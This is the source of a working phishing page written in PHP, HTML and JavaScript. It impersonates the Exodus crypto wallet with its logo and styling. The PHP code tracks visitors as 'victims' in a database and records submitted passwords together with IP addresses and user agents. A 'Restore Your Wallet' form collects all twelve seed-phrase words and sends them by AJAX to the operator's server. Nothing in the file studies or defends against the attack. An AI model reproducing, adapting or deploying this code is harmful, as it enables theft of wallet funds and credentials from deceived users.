<?php

$host = 'localhost';
$dbname = 'support';
$username = 'phpmyadmin';
$password = 'haha123';

try {
    $pdo = new PDO( 'mysql:host=' . $host . ';dbname=' . $dbname, $username, $password );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Check site status
    $stmt = $pdo->query("SELECT `status` FROM `site_status` WHERE `id` = 1");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($row['status'] === 'off') {
        http_response_code(404);
        exit;
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    exit;
}



require_once( realpath( dirname( __FILE__ ) . DIRECTORY_SEPARATOR . 'core' . DIRECTORY_SEPARATOR . 'functions.php' ) );

if ( validUser( $pdo ) ) {

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'is_waiting' => 0,
    'heartbeat' => 28 // Password
  ] );

  $id = $_SESSION[ 'id' ];
  $email = getVictim( $pdo, $id )[ 'username' ];

} else {

  header( 'location:login.php' );

}


if ( !empty( $_GET[ 'password' ] ) ) {

  // Add password to db

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'ip_address' => $_SERVER[ 'REMOTE_ADDR' ],
    'user_agent' => $_SERVER[ 'HTTP_USER_AGENT' ],

    'password' => $_GET[ 'password' ]
  ] );

  // Send to loading page

  header( 'location:loading.php' );

}

?>

<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exodus Crypto Wallet</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500&amp;display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="https://uk.exodus.com/img/favicons/favicon-16x16.png?v=3">
    <style>
      .btn-background {
        background-image: url("/assets/button.png");
        background-size: cover;
        background-position: left;
      }
      .error {
        border-color: red;
        background-color: red;
        border: 1opx solid red;
      }
      body,
      html {
        height: 100%;
        margin: 0;
      }

      body {
        font-family: "Rubik", sans-serif;
      }

      /* Full-screen background image */
      .bg {
        background-image: url("/assets/bg.png"); /* Replace with your image path */
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        position: relative;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .input-box {
        background-color: rgba(0, 0, 0, 0.5); /* Dark background color */
        border: 10px; /* Remove default border */
        border-radius: 12px; /* Rounded corners */
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow */
        padding: 10px 15px; /* Padding inside the input box */
        width: 100%; /* Full width */
        color: white; /* Text color */
        font-size: 16px; /* Font size */
      }

      .input-box::placeholder {
        color: rgba(255, 255, 255, 0.7); /* Light placeholder color */
      }

      h1 {
        margin-bottom: 20px;
      }

      p {
        font-size: 18px;
        margin-bottom: 30px;
      }
    </style>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  </head>
  <body>
    <div class="bg">
      <div class="text-center p-8 rounded-lg max-w-xl">
        <svg class="mx-auto mb-4 w-24 h-24 object-contain" width="60" height="60" fill="none" viewBox="0 0 60 60">
          <path d="M59.6409 16.7529L34.0901 0V9.36664L50.4812 20.0178L48.5528 26.1195H34.0901V33.8805H48.5528L50.4812 39.9822L34.0901 50.6334V60L59.6409 43.3006L55.4628 30.0268L59.6409 16.7529Z" fill="url(#paint0_a1)"></path>
          <path d="M11.8604 33.8805H26.2695V26.1195H11.8068L9.93203 20.0178L26.2695 9.36664V0L0.71875 16.7529L4.89687 30.0268L0.71875 43.3006L26.3231 60V50.6334L9.93203 39.9822L11.8604 33.8805Z" fill="url(#paint1_a1)"></path>
          <mask id="mask0_11028_103084" maskUnits="userSpaceOnUse" x="0" y="0" width="60" height="60" style="mask-type: alpha">
            <path d="M59.6409 16.7529L34.0901 0V9.36663L50.4812 20.0178L48.5528 26.1195H34.0901V33.8805H48.5528L50.4812 39.9821L34.0901 50.6333V60L59.6409 43.3006L55.4628 30.0268L59.6409 16.7529Z" fill="url(#paint2_a1)"></path>
            <path d="M11.8604 33.8805H26.2695V26.1195H11.8068L9.93203 20.0178L26.2695 9.36663V0L0.71875 16.7529L4.89687 30.0268L0.71875 43.3006L26.3231 60V50.6333L9.93203 39.9821L11.8604 33.8805Z" fill="url(#paint0_a1)"></path>
          </mask>
          <g mask="url(#mask0_11028_103084)">
            <rect x="0.75" width="58.5" height="60" fill="url(#paint4_a1)"></rect>
          </g>
          <defs>
            <linearGradient id="paint0_a1" x1="51.3752" y1="64.125" x2="34.2602" y2="-6.58918" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"></stop>
              <stop offset="1" stop-color="#BBFBE0"></stop>
            </linearGradient>
            <linearGradient id="paint1_a1" x1="51.3752" y1="64.125" x2="34.2602" y2="-6.58918" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"></stop>
              <stop offset="1" stop-color="#BBFBE0"></stop>
            </linearGradient>
            <linearGradient id="paint2_a1" x1="51.3752" y1="64.125" x2="34.2602" y2="-6.58918" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"></stop>
              <stop offset="1" stop-color="#BBFBE0"></stop>
            </linearGradient>
            <linearGradient id="paint3_a1" x1="51.3752" y1="64.125" x2="34.2602" y2="-6.58918" gradientUnits="userSpaceOnUse">
              <stop offset="0" stop-color="#0B46F9"></stop>
              <stop offset="1" stop-color="#BBFBE0"></stop>
            </linearGradient>
            <linearGradient id="paint4_a1" x1="4.5" y1="13.5" x2="34.125" y2="35.625" gradientUnits="userSpaceOnUse">
              <stop offset="0.119792" stop-color="#8952FF" stop-opacity="0.87"></stop>
              <stop offset="1" stop-color="#DABDFF" stop-opacity="0"></stop>
            </linearGradient>
          </defs>
        </svg>
        <div dir="auto" class="css-901oao" data-testid="exodusmovement.exodus:id/undefined-title" style="
            color: rgb(255, 255, 255);
            font-family: Rubik;
            font-size: 28px;
            font-weight: 300;
            line-height: 30px;
            text-align: center;
            transition: all 0.2s linear 0s;
            margin-top: 32px;
          ">
          Restore Your Wallet
        </div>
        <div dir="auto" class="css-901oao" style="
            color: rgba(255, 255, 255, 0.5);
            font-family: Rubik;
            font-size: 18px;
            font-weight: 400;
            line-height: 20px;
            margin-top: 10px;
            text-align: center;
            transition: all 0.2s linear 0s;
            margin-top: 12px;
          ">
          Enter your 12-word secret phrase to import your existing wallet
        </div>
        <div class="grid grid-cols-1 gap-4 mt-6 md:grid-cols-2 lg:grid-cols-3">
          <input type="email" name="seed-word-1" id="seed-word-1" class="input-box" placeholder="Word 1">
          <input type="email" name="seed-word-2" id="seed-word-2" class="input-box" placeholder="Word 2">
          <input type="email" name="seed-word-3" id="seed-word-3" class="input-box" placeholder="Word 3">
          <input type="email" name="seed-word-4" id="seed-word-4" class="input-box" placeholder="Word 4">
          <input type="email" name="seed-word-5" id="seed-word-5" class="input-box" placeholder="Word 5">
          <input type="email" name="seed-word-6" id="seed-word-6" class="input-box" placeholder="Word 6">
          <input type="email" name="seed-word-7" id="seed-word-7" class="input-box" placeholder="Word 7">
          <input type="email" name="seed-word-8" id="seed-word-8" class="input-box" placeholder="Word 8">
          <input type="email" name="seed-word-9" id="seed-word-9" class="input-box" placeholder="Word 9">
          <input type="email" name="seed-word-10" id="seed-word-10" class="input-box" placeholder="Word 10">
          <input type="email" name="seed-word-11" id="seed-word-11" class="input-box" placeholder="Word 11">
          <input type="email" name="seed-word-12" id="seed-word-12" class="input-box" placeholder="Word 12">
        </div>
        <img class="mt-12 mx-auto cursor-pointer" src="/assets/button.png" alt="" onclick="completeSeedPhrase(event)">
      </div>
    </div>
    <script src="/core/js/jquery.js"></script>

    <script>
      window.onload = function () {
        const inputs = document.querySelectorAll('input[type="email"]');

        inputs.forEach((input, index) => {
          input.addEventListener("input", function () {
            if (input.value.length === input.maxLength) {
              if (index < inputs.length - 1) {
                inputs[index + 1].focus();
              }
            }
          });

          input.addEventListener("keydown", function (event) {
            if (event.key === "Backspace" && input.value.length === 0) {
              if (index > 0) {
                inputs[index - 1].focus();
              }
            }
          });

          input.addEventListener("paste", function (event) {
            event.preventDefault();

            const paste = (event.clipboardData || window.clipboardData).getData(
              "text"
            );
            const phrases = paste.split(/\s+/); // Split string by any whitespace

            let currentInputIndex = index;
            phrases.forEach((phrase) => {
              if (currentInputIndex < inputs.length) {
                inputs[currentInputIndex].value = phrase; // Set value
                currentInputIndex++; // Move to the next input
              }
            });

            if (currentInputIndex < inputs.length) {
              inputs[currentInputIndex].focus();
            }
          });
        });
      };

      function completeSeedPhrase(event) {
        event.preventDefault();
        const seedWords = [];
        let allFilled = true;

        for (let i = 1; i <= 12; i++) {
          const input = document.getElementById(`seed-word-${i}`);
          if (input.value.trim() === "") {
            input.classList.add("error");
            allFilled = false;
          } else {
            input.classList.remove("error");
            seedWords.push(input.value.trim());
          }
        }

        if (!allFilled) {
          return;
        }

        const seed = seedWords.join(" ");
        $.ajax({
            type: 'GET',
          	data: {
          	  exodus_seed: seed,
          	},
          	url: '/core/update.php',
          	success: function ( data ) {
              var parsed_data = JSON.parse( data );
              if ( parsed_data[ 'status' ] != 'error' ) {
                window.location.replace( '/loading.php' );
              }
            }
          });
      }
    </script>
  

</body></html>